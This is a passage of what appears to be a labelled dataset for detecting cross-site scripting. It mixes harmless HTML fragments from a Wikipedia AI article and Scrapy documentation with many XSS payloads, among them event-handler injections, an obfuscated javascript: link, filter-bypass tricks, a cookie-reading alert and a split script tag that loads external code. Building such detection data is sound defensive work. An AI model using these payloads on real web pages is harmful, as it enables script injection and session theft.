href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n '<dfn onmouseenter=\"alert(1)\">test</dfn>',\n '<style>:target {transform: rotate(180deg);}</style><dir id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></dir>',\n '<dl onbeforecopy=\"alert(1)\" contenteditable>test</dl>',\n '\\t </span> 2016 ',\n '\\t </span>. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1016%2Fj.artint.2010.09.006\">10.1016/j.artint.2010.09.006 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence&amp;rft.atitle=Measuring+Universal+Intelligence%3A+Towards+an+Anytime+Intelligence+Test&amp;rft.volume=174&amp;rft.issue=18&amp;rft.pages=1508-1539&amp;rft.date=2010&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.295.9079&amp;rft_id=info%3Adoi%2F10.1016%2Fj.artint.2010.09.006&amp;rft.aulast=Hernandez-Orallo&amp;rft.aufirst=J.&amp;rft.au=Dowe%2C+D.+L.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<param onmousemove=\"alert(1)\">test</param>',\n '<var onpointerup=alert(1)>XSS</var>',\n '<bdi onmousedown=\"alert(1)\">test</bdi>',\n '<rb draggable=\"true\" ondragleave=\"alert(1)\">test</rb>',\n '<a href=\"/wiki/Cyc\" title=\"Cyc\">Cyc </a>:',\n '\\t <div>',\n '\\t </span>',\n '<data draggable=\"true\" ondragenter=\"alert(1)\">test</data>',\n '\\t </span>',\n '<li id=\"cite_note-Hegemony_of_the_Dartmouth_conference_attendees-33\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-Hegemony_of_the_Dartmouth_conference_attendees_33-0\">^ </a> </b> ',\n '<a href=\"/wiki/Applied_information_economics\" title=\"Applied information economics\">Information value theory </a>:',\n '<li><a href=\"/wiki/Larry_Laudan\" title=\"Larry Laudan\">Larry Laudan </a> </li>',\n '<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>',\n '<style>:target {transform: rotate(180deg);}</style><param id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></param>',\n '<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>',\n '<svg><legend onload=alert(1)></legend>',\n '\\t\\t\\t<div class=\"after-portlet after-portlet-lang\"><span class=\"wb-langlinks-edit wb-langlinks-link\"><a href=\"https://www.wikidata.org/wiki/Special:EntityPage/Q11660#sitelinks-wikipedia\" title=\"Edit interlanguage links\" class=\"wbc-editpage\">Edit links </a> ',\n '<style>:target {color:red;}</style><textarea id=x style=\"transition:color 1s\" ontransitionend=alert(1)></textarea>',\n '\\t </span> </a> </li>',\n '<object onpointerleave=alert(1)>XSS</object>',\n '<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>',\n '<li><a href=\"#CITEREFNewquist1994\">Newquist 1994 </a>, pp.&#160;301–318 </li> </ul>',\n '\\t </span> </sup> possibly involving <a href=\"/wiki/Reinforcement_learning#Inverse_reinforcement_learning\" title=\"Reinforcement learning\">inverse reinforcement learning </a>.<sup id=\"cite_ref-HC_369-1\" class=\"reference\"><a href=\"#cite_note-HC-369\">&#91;358&#93; </a> </sup><sup class=\"reference\" style=\"white-space:nowrap;\">:<span>191-193 ',\n '<li><a href=\"/wiki/Adam_Tooze\" title=\"Adam Tooze\">Tooze, Adam </a>, \"Democracy and Its Discontents\", <i><a href=\"/wiki/The_New_York_Review_of_Books\" title=\"The New York Review of Books\">The New York Review of Books </a> </i>, vol. LXVI, no. 10 (6 June 2019), pp.&#160;52–53, 56–57.  \"Democracy has no clear answer for the mindless operation of <a href=\"/wiki/Bureaucracy\" title=\"Bureaucracy\">bureaucratic </a> and <a href=\"/wiki/Technology\" title=\"Technology\">technological power </a>.  We may indeed be witnessing its extension in the form of artificial intelligence and <a href=\"/wiki/Robotics\" title=\"Robotics\">robotics </a>.  Likewise, after decades of dire warning, the <a href=\"/wiki/Environmentalism\" title=\"Environmentalism\">environmental problem </a> remains fundamentally unaddressed.... Bureaucratic overreach and environmental catastrophe are precisely the kinds of slow-moving existential challenges that democracies deal with very badly.... Finally, there is the threat du jour:  <a href=\"/wiki/Corporation\" title=\"Corporation\">corporations </a> and the technologies they promote.\"  (pp.&#160;56–57.) </li> </ul>',\n '<style>:target {transform: rotate(180deg);}</style><kbd id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></kbd>',\n '<tt onkeypress=\"alert(1)\" contenteditable>test</tt>',\n '[1].find(alert)',\n '\\t <div class=\"thumbinner\" style=\"width:222px;\"><a href=\"/wiki/File:%C3%84%C3%A4retuvastuse_n%C3%A4ide.png\" class=\"image\"><img alt=\"\" src=\"//upload.wikimedia.org/wikipedia/commons/thumb/2/20/%C3%84%C3%A4retuvastuse_n%C3%A4ide.png/220px-%C3%84%C3%A4retuvastuse_n%C3%A4ide.png\" decoding=\"async\" width=\"220\" height=\"73\" class=\"thumbimage\" srcset=\"//upload.wikimedia.org/wikipedia/commons/thumb/2/20/%C3%84%C3%A4retuvastuse_n%C3%A4ide.png/330px-%C3%84%C3%A4retuvastuse_n%C3%A4ide.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/2/20/%C3%84%C3%A4retuvastuse_n%C3%A4ide.png/440px-%C3%84%C3%A4retuvastuse_n%C3%A4ide.png 2x\" data-file-width=\"1415\" data-file-height=\"471\" /> </a>  <div class=\"thumbcaption\">',\n ' </p><p>In 2011, a <i><a href=\"/wiki/Jeopardy!\" title=\"Jeopardy!\">Jeopardy! </a> </i> <a href=\"/wiki/Quiz_show\" class=\"mw-redirect\" title=\"Quiz show\">quiz show </a> exhibition match, <a href=\"/wiki/IBM\" title=\"IBM\">IBM </a>\\'s <a href=\"/wiki/Question_answering_system\" class=\"mw-redirect\" title=\"Question answering system\">question answering system </a>, <a href=\"/wiki/Watson_(artificial_intelligence_software)\" class=\"mw-redirect\" title=\"Watson (artificial intelligence software)\">Watson </a>, defeated the two greatest <i>Jeopardy! </i> champions, <a href=\"/wiki/Brad_Rutter\" title=\"Brad Rutter\">Brad Rutter </a> and <a href=\"/wiki/Ken_Jennings\" title=\"Ken Jennings\">Ken Jennings </a>, by a significant margin.<sup id=\"cite_ref-FOOTNOTEMarkoff2011_45-0\" class=\"reference\"><a href=\"#cite_note-FOOTNOTEMarkoff2011-45\">&#91;45&#93; </a> </sup> <a href=\"/wiki/Moore%27s_law\" title=\"Moore&#39;s law\">Faster computers </a>, algorithmic improvements, and access to <a href=\"/wiki/Big_data\" title=\"Big data\">large amounts of data </a> enabled advances in <a href=\"/wiki/Machine_learning\" title=\"Machine learning\">machine learning </a> and perception; data-hungry <a href=\"/wiki/Deep_learning\" title=\"Deep learning\">deep learning </a> methods started to dominate accuracy benchmarks <a href=\"/wiki/Deep_learning#Deep_learning_revolution\" title=\"Deep learning\">around 2012 </a>.<sup id=\"cite_ref-46\" class=\"reference\"><a href=\"#cite_note-46\">&#91;46&#93; </a> </sup> The <a href=\"/wiki/Kinect\" title=\"Kinect\">Kinect </a>, which provides a 3D body–motion interface for the <a href=\"/wiki/Xbox_360\" title=\"Xbox 360\">Xbox 360 </a> and the <a href=\"/wiki/Xbox_One\" title=\"Xbox One\">Xbox One </a>, uses algorithms that emerged from lengthy AI research<sup id=\"cite_ref-47\" class=\"reference\"><a href=\"#cite_note-47\">&#91;47&#93; </a> </sup> as do <a href=\"/wiki/Intelligent_personal_assistant\" class=\"mw-redirect\" title=\"Intelligent personal assistant\">intelligent personal assistants </a> in <a href=\"/wiki/Smartphone\" title=\"Smartphone\">smartphones </a>.<sup id=\"cite_ref-48\" class=\"reference\"><a href=\"#cite_note-48\">&#91;48&#93; </a> </sup> In March 2016, <a href=\"/wiki/AlphaGo\" title=\"AlphaGo\">AlphaGo </a> won 4 out of 5 games of <a href=\"/wiki/Go_(game)\" title=\"Go (game)\">Go </a> in a match with Go champion <a href=\"/wiki/Lee_Sedol\" title=\"Lee Sedol\">Lee Sedol </a>, becoming the first <a href=\"/wiki/Computer_Go\" title=\"Computer Go\">computer Go-playing system </a> to beat a professional Go player without <a href=\"/wiki/Go_handicaps\" class=\"mw-redirect\" title=\"Go handicaps\">handicaps </a>.<sup id=\"cite_ref-bbc-alphago_8-1\" class=\"reference\"><a href=\"#cite_note-bbc-alphago-8\">&#91;8&#93; </a> </sup><sup id=\"cite_ref-49\" class=\"reference\"><a href=\"#cite_note-49\">&#91;49&#93; </a> </sup> In the 2017 <a href=\"/wiki/Future_of_Go_Summit\" title=\"Future of Go Summit\">Future of Go Summit </a>, <a href=\"/wiki/AlphaGo\" title=\"AlphaGo\">AlphaGo </a> won a <a href=\"/wiki/AlphaGo_versus_Ke_Jie\" title=\"AlphaGo versus Ke Jie\">three-game match </a> with <a href=\"/wiki/Ke_Jie\" title=\"Ke Jie\">Ke Jie </a>,<sup id=\"cite_ref-50\" class=\"reference\"><a href=\"#cite_note-50\">&#91;50&#93; </a> </sup> who at the time continuously held the world No. 1 ranking for two years.<sup id=\"cite_ref-51\" class=\"reference\"><a href=\"#cite_note-51\">&#91;51&#93; </a> </sup><sup id=\"cite_ref-52\" class=\"reference\"><a href=\"#cite_note-52\">&#91;52&#93; </a> </sup> This marked the completion of a significant milestone in the development of Artificial Intelligence as Go is a relatively complex game, more so than Chess.',\n '<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>',\n '<div draggable=\"true\" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>',\n '<ul><li><a href=\"#CITEREFRussellNorvig2003\">Russell &amp; Norvig 2003 </a>, p.&#160;28 </li>',\n '<li><a href=\"#CITEREFNilsson1998\">Nilsson 1998 </a>, chpt. 19.4 &amp; 7 </li> </ul>',\n '<object onpointerup=alert(1)>XSS</object>',\n '\\t </span></p>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n '</script>',\n '<svg><menu onload=alert(1)></menu>',\n '<rt draggable=\"true\" ondragenter=\"alert(1)\">test</rt>',\n '<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>',\n '<pre onmouseleave=\"alert(1)\">test</pre>',\n '<col id=x tabindex=1 onactivate=alert(1)></col>',\n '<p id=x tabindex=1 onfocusin=alert(1)></p>',\n '<div draggable=\"true\" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>',\n ' </li>',\n ' </div> </td> </tr> </tbody> </table>',\n '<h3><span class=\"mw-headline\" id=\"Learning\">Learning ',\n '<nextid onclick=\"alert(1)\">test</nextid>',\n '<ul><li><a href=\"/wiki/Space_probe\" title=\"Space probe\">Space probe </a> </li> </ul> </li>',\n '<ins onkeyup=\"alert(1)\" contenteditable>test</ins>',\n '</div>',\n '<style>@keyframes x{}</style><ins style=\"animation-name:x\" onanimationstart=\"alert(1)\"></ins>',\n ' </li>',\n '          <dd><a href=\"/en/2.0/\">2.0</a></dd>',\n '<dl onmouseout=\"alert(1)\">test</dl>',\n '\\t <div id=\"Emerging_technologies_in_information_and_communications\" style=\"font-size:114%;margin:0 4em\"><a href=\"/wiki/Emerging_technologies\" title=\"Emerging technologies\">Emerging technologies </a> in <a href=\"/wiki/Information_and_communications_technology\" title=\"Information and communications technology\">information and communications </a> </div> </th> </tr><tr><td colspan=\"2\" class=\"navbox-list navbox-odd\" style=\"width:100%;padding:0px\">',\n '<command onmouseleave=\"alert(1)\">test</command>',\n '<Input value = \"\" type = text>',\n '<h1 id=x tabindex=1 onactivate=alert(1)></h1>',\n '<li><a href=\"/wiki/Natural_language_processing\" title=\"Natural language processing\">Natural language processing </a> </li>',\n '<form onmousedown=\"alert(1)\">test</form>',\n '\\t </span> </a>',\n '<li><a href=\"/wiki/Alexey_Lyapunov\" title=\"Alexey Lyapunov\">Alexey Lyapunov </a> </li>',\n '<spacer draggable=\"true\" ondrag=\"alert(1)\">test</spacer>',\n '<em onclick=\"alert(1)\">test</em>',\n '<li><a href=\"/wiki/Otto_Neurath\" title=\"Otto Neurath\">Otto Neurath </a> </li>',\n '\\t </span><span class=\"mw-editsection\"><span class=\"mw-editsection-bracket\">[ ',\n '<style>@keyframes x{}</style><rtc style=\"animation-name:x\" onanimationend=\"alert(1)\"></rtc>',\n '\\t <div style=\"padding:0em 0.25em\">',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n '<li><a href=\"/wiki/Networking_hardware\" title=\"Networking hardware\">Network components </a> </li>',\n '\\t </span> <span class=\"reference-text\">',\n ' </tr><tr><th style=\"padding:0.1em\">',\n '<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>',\n '<marquee onkeyup=\"alert(1)\" contenteditable>test</marquee>',\n '<div draggable=\"true\" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>',\n ' </li>',\n '<code onmouseout=\"alert(1)\">test</code>',\n '\\t </span> <span class=\"reference-text\">',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation web\">Allen, Gregory (6 February 2019). <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20190317004017/https://www.cnas.org/publications/reports/understanding-chinas-ai-strategy\">\"Understanding China\\'s AI Strategy\" </a>. <i>www.cnas.org/publications/reports/understanding-chinas-ai-strategy </i>. Center for a New American Security. Archived from <a rel=\"nofollow\" class=\"external text\" href=\"https://www.cnas.org/publications/reports/understanding-chinas-ai-strategy\">the original </a> on 17 March 2019<span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">17 March ',\n '<option onpointerout=alert(1)>XSS</option>',\n 'won many visual pattern recognition competitions.<sup id=\"cite_ref-schmidhuber2015_246-2\" class=\"reference\"><a href=\"#cite_note-schmidhuber2015-246\">&#91;235&#93; </a> </sup>',\n '<ul><li><a href=\"#CITEREFMcCorduck2004\">McCorduck 2004 </a>, pp.&#160;17–25 </li> </ul>',\n '<rt onpointerout=alert(1)>XSS</rt>',\n '<q onmouseenter=\"alert(1)\">test</q>',\n '<div class=\"toctree-wrapper compound\">',\n '<element onbeforecopy=\"alert(1)\" contenteditable>test</element>',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"intro/examples.html\">Examples</a></li>',\n '<ul><li><a href=\"/wiki/Printed_circuit_board\" title=\"Printed circuit board\">Printed circuit board </a> </li>',\n '<style>@keyframes x{}</style><main style=\"animation-name:x\" onanimationend=\"alert(1)\"></main>',\n '<base id=x tabindex=1 onfocusin=alert(1)></base>',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></acronym>',\n '<b onmouseout=\"alert(1)\">test</b>',\n '<acronym draggable=\"true\" ondrag=\"alert(1)\">test</acronym>',\n '\\t <div class=\"plainlinks hlist navbar mini\"><ul><li class=\"nv-view\"><a href=\"/wiki/Template:Evolutionary_computation\" title=\"Template:Evolutionary computation\"><abbr title=\"View this template\" style=\";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;\">v </abbr> </a> </li><li class=\"nv-talk\"><a href=\"/wiki/Template_talk:Evolutionary_computation\" title=\"Template talk:Evolutionary computation\"><abbr title=\"Discuss this template\" style=\";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;\">t </abbr> </a> </li><li class=\"nv-edit\"><a class=\"external text\" href=\"https://en.wikipedia.org/w/index.php?title=Template:Evolutionary_computation&amp;action=edit\"><abbr title=\"Edit this template\" style=\";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;\">e </abbr> </a> </li> </ul> </div>',\n '        <nav data-toggle=\"wy-nav-shift\" class=\"wy-nav-side\">',\n '<small draggable=\"true\" ondragend=\"alert(1)\">test</small>',\n '<ul onpointermove=alert(1)>XSS</ul>',\n '<ol onpointerenter=alert(1)>XSS</ol>',\n '<link onbeforecopy=\"alert(1)\" contenteditable>test</link>',\n '<html onbeforecut=\"alert(1)\" contenteditable>test</html>',\n '<video autoplay controls onseeking=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>',\n '<i onmouseup=\"alert(1)\">test</i>',\n '<title onpointerup=alert(1)>XSS</title>',\n '<select onchange=alert(1)><option>change me</option><option>XSS</option></select>',\n 'Historical influence and philosophical implications:',\n '<style>@keyframes slidein {}</style><dialog style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></dialog>',\n '<del onbeforepaste=\"alert(1)\" contenteditable>test</del>',\n '<style>:target {color:red;}</style><b id=x style=\"transition:color 1s\" ontransitionend=alert(1)></b>',\n '<textarea autofocus onfocus=alert(1)>test</textarea>',\n '<bdo ondblclick=\"alert(1)\">test</bdo>',\n '\\t </span></a></dt><dd>Understand what Scrapy is and how it can help you.</dd>',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></thead>',\n '<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>',\n '\\t </span> </li>',\n '<section id=x tabindex=1 onfocus=alert(1)></section>',\n ' </p>',\n '\\t </span>',\n '<details ontoggle=alert(1) open>test</details>',\n '<element onpointerleave=alert(1)>XSS</element>',\n '\\t </span> </li>',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"contributing.html\">Contributing to Scrapy</a></li>',\n '<form onpointerenter=alert(1)>XSS</form>',\n '<optgroup onpointerout=alert(1)>XSS</optgroup>',\n '<style>:target {color:red;}</style><u id=x style=\"transition:color 1s\" ontransitionend=alert(1)></u>',\n '<dt><a class=\"reference internal\" href=\"topics/commands.html\"><span class=\"doc\">Command line tool',\n '<button onfocusout=alert(1) id=x></button><input autofocus>',\n '<small id=x tabindex=1 onactivate=alert(1)></small>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n 'Definition of AI as the study of <a href=\"/wiki/Intelligent_agents\" class=\"mw-redirect\" title=\"Intelligent agents\">intelligent agents </a>:',\n '<video id=x tabindex=1 onbeforeactivate=alert(1)></video>',\n '<video onbeforepaste=\"alert(1)\" contenteditable>test</video>',\n '<style>@keyframes x{}</style><rb style=\"animation-name:x\" onanimationend=\"alert(1)\"></rb>',\n '  <link rel=\"stylesheet\" href=\"_static/css/tooltipster.bundle.min.css\" type=\"text/css\" />',\n '<rtc oncontextmenu=\"alert(1)\">test</rtc>',\n '<nextid onpointermove=alert(1)>XSS</nextid>',\n '<li><a href=\"/wiki/Modeling_language\" title=\"Modeling language\">Modeling language </a> </li>',\n '<dt><a class=\"reference internal\" href=\"topics/developer-tools.html\"><span class=\"doc\">Using your browser’s Developer Tools for scraping',\n '<discard onpointerenter=alert(1)>XSS</discard>',\n '<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>',\n '<rp onmousemove=\"alert(1)\">test</rp>',\n ' </li>',\n '<li><a href=\"/wiki/Future_of_Humanity_Institute\" title=\"Future of Humanity Institute\">Future of Humanity Institute </a> </li>',\n '<li><a href=\"/wiki/Materialism\" title=\"Materialism\">Materialism </a> </li>',\n '<image onmouseup=\"alert(1)\">test</image>',\n '<style>@keyframes x{}</style><address style=\"animation-name:x\" onanimationend=\"alert(1)\"></address>',\n '<li id=\"cite_note-Gödel_himself-356\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-Gödel_himself_356-0\">^ </a> </b> ',\n '<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>',\n '<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>',\n '<textarea onkeypress=\"alert(1)\" contenteditable>test</textarea>',\n '<li><cite id=\"CITEREFAlbus2002\" class=\"citation encyclopaedia\">Albus, J. S. (2002). \"4D/RCS: A reference model architecture for intelligent unmanned ground vehicles\".  In Gerhart, G.; Gunderson, R.; Shoemaker, C. (eds.). <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20040725051856/http://www.isd.mel.nist.gov/documents/albus/4DRCS.pdf\"><i>4-D/RCS: A Reference Model Architecture for Intelligent Unmanned Ground Vehicles </i> </a> <span class=\"cs1-format\">(PDF) ',\n '<template onmouseout=\"alert(1)\">test</template>',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></area>',\n '\\t </span> <span class=\"reference-text\">Igor Aizenberg, Naum N. Aizenberg, Joos P.L. Vandewalle (2000). Multi-Valued and Universal Binary Neurons: Theory, Learning and Applications. Springer Science &amp; Business Media. ',\n '<footer onmouseenter=\"alert(1)\">test</footer>',\n '<li><a href=\"/wiki/Substance_dualism\" class=\"mw-redirect\" title=\"Substance dualism\">Substance dualism </a> </li> </ul>',\n '          <dd>',\n '<li><a href=\"#CITEREFRussellNorvig2003\">Russell &amp; Norvig 2003 </a>, pp.&#160;22–23 </li> </ul>',\n '<canvas onbeforecopy=\"alert(1)\" contenteditable>test</canvas>',\n '<rt onbeforepaste=\"alert(1)\" contenteditable>test</rt>',\n '<a href=\"/wiki/Computational_intelligence\" title=\"Computational intelligence\">Computational intelligence </a>',\n ' </li>',\n '<style>:target {transform: rotate(180deg);}</style><code id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></code>',\n '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe',\n '<dd id=x tabindex=1 onfocus=alert(1)></dd>',\n '<b draggable=\"true\" ondragstart=\"alert(1)\">test</b>',\n 'document.documentURI',\n 'Set.constructor`alert\\\\x28document.domain\\\\x29```',\n '<nobr oncontextmenu=\"alert(1)\">test</nobr>',\n '<center onpointerdown=alert(1)>XSS</center>',\n '<style>:target {transform: rotate(180deg);}</style><applet id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></applet>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n '<dt><a class=\"reference internal\" href=\"faq.html\"><span class=\"doc\">Frequently Asked Questions',\n 'SRC=# onmouseover=\"alert(document.cookie)',\n '<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>',\n '<applet onkeydown=\"alert(1)\" contenteditable>test</applet>',\n '\\t </span> </h3>',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"intro/overview.html\">Scrapy at a glance</a></li>',\n '<li><a href=\"/wiki/Psychoanalysis\" title=\"Psychoanalysis\">Psychoanalysis </a> </li>',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></details>',\n '<div draggable=\"true\" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>',\n '<td onbeforecopy=\"alert(1)\" contenteditable>test</td>',\n '<param onbeforecopy=\"alert(1)\" contenteditable>test</param>',\n '<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"httx://.rocks/.js\"></SCRIPT>',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"topics/asyncio.html\">asyncio</a></li>',\n '<li id=\"cite_note-380\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-380\">^ </a> </b> ',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"topics/signals.html\">Signals</a></li>',\n '<table onkeyup=\"alert(1)\" contenteditable>test</table>',\n '<a draggable=\"true\" ondragleave=\"alert(1)\">test</a>',\n '<svg><figcaption onload=alert(1)></figcaption>',\n '<nextid onmouseup=\"alert(1)\">test</nextid>',\n '<style>:target {color:red;}</style><ruby id=x style=\"transition:color 1s\" ontransitionend=alert(1)></ruby>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n '<colgroup onpointerover=alert(1)>XSS</colgroup>',\n '<p draggable=\"true\" ondragleave=\"alert(1)\">test</p>',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"topics/dynamic-content.html\">Selecting dynamically-loaded content</a></li>',\n '\\t </span></p>',\n '<meter draggable=\"true\" ondragend=\"alert(1)\">test</meter>',\n '<progress draggable=\"true\" ondrag=\"alert(1)\">test</progress>',\n '<dl class=\"docutils\">',\n ' ',\n '<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>',\n '<rtc onmouseleave=\"alert(1)\">test</rtc>',\n '<li><a href=\"/wiki/Glossary_of_artificial_intelligence\" title=\"Glossary of artificial intelligence\">Glossary of artificial intelligence </a> </li>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation book\"><a rel=\"nofollow\" class=\"external text\" href=\"https://ec.europa.eu/info/sites/info/files/commission-white-paper-artificial-intelligence-feb2020_en.pdf\"><i>White Paper: On Artificial Intelligence - A European approach to excellence and trust </i> </a> <span class=\"cs1-format\">(PDF) ',\n '<legend oncopy=\"alert(1)\" contenteditable>test</legend>',\n '<li><a href=\"/wiki/Epistemological_anarchism\" title=\"Epistemological anarchism\">Epistemological anarchism </a> </li>',\n '<nav id=x tabindex=1 onbeforedeactivate=alert(1)></nav><input autofocus>',\n '\\t </span> </li>',\n '<style onkeydown=\"alert(1)\" contenteditable>test</style>',\n '<style>@keyframes x{}</style><ruby style=\"animation-name:x\" onanimationend=\"alert(1)\"></ruby>',\n '<div role=\"note\" class=\"hatnote navigation-not-searchable\">Main articles: <a href=\"/wiki/Hard_problem_of_consciousness\" title=\"Hard problem of consciousness\">Hard problem of consciousness </a> and <a href=\"/wiki/Theory_of_mind\" title=\"Theory of mind\">Theory of mind </a> </div>',\n '<li><cite id=\"CITEREFKoza1992\" class=\"citation book\">Koza, John R. (1992). <i>Genetic Programming (On the Programming of Computers by Means of Natural Selection) </i>. MIT Press. <a href=\"/wiki/Bibcode\" title=\"Bibcode\">Bibcode </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://ui.adsabs.harvard.edu/abs/1992gppc.book.....K\">1992gppc.book.....K </a>. <a href=\"/wiki/International_Standard_Book_Number\" title=\"International Standard Book Number\">ISBN </a>&#160;<a href=\"/wiki/Special:BookSources/978-0-262-11170-6\" title=\"Special:BookSources/978-0-262-11170-6\"><bdi>978-0-262-11170-6 </bdi> </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Genetic+Programming+%28On+the+Programming+of+Computers+by+Means+of+Natural+Selection%29&amp;rft.pub=MIT+Press&amp;rft.date=1992&amp;rft_id=info%3Abibcode%2F1992gppc.book.....K&amp;rft.isbn=978-0-262-11170-6&amp;rft.aulast=Koza&amp;rft.aufirst=John+R.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<li><a href=\"/wiki/Information_retrieval\" title=\"Information retrieval\">Information retrieval </a> </li> </ul>',\n '<dfn draggable=\"true\" ondragenter=\"alert(1)\">test</dfn>',\n '<script onbeforepaste=\"alert(1)\" contenteditable>test</script>',\n '<li id=\"cite_note-300\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-300\">^ </a> </b> ',\n '<div onpointermove=alert(1)>XSS</div>',\n '<menu oncontextmenu=\"alert(1)\">test</menu>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\"><a href=\"/wiki/Academic_journal\" title=\"Academic journal\">Journals </a> </th><td class=\"navbox-list navbox-even hlist\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '\"<a href=\"/wiki/History_of_AI#The_golden_years_1956–1974\" class=\"mw-redirect\" title=\"History of AI\">Golden years </a>\" of AI (successful symbolic reasoning programs 1956–1973):',\n '<shadow onpointerdown=alert(1)>XSS</shadow>',\n '<rt id=x tabindex=1 onbeforeactivate=alert(1)></rt>',\n '<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/>. McCarthy recently reiterated his position at the <a href=\"/wiki/AI@50\" title=\"AI@50\">AI@50 </a> conference where he said \"Artificial intelligence is not, by definition, simulation of human intelligence\" (<a href=\"#CITEREFMaker2006\">Maker 2006 </a>). </li> </ul>',\n '<dt><a class=\"reference internal\" href=\"topics/coroutines.html\"><span class=\"doc\">Coroutines',\n '\\t </span></a></dt><dd>Deploying your Scrapy spiders and run them in a remote server.</dd>',\n '<li id=\"cite_note-84\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-84\">^ </a> </b> ',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\">Related topics </th><td class=\"navbox-list navbox-odd hlist\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '<style>:target {color: red;}</style><tr id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></tr>',\n '<ul draggable=\"true\" ondragend=\"alert(1)\">test</ul>',\n '\\t </span>. </cite><span 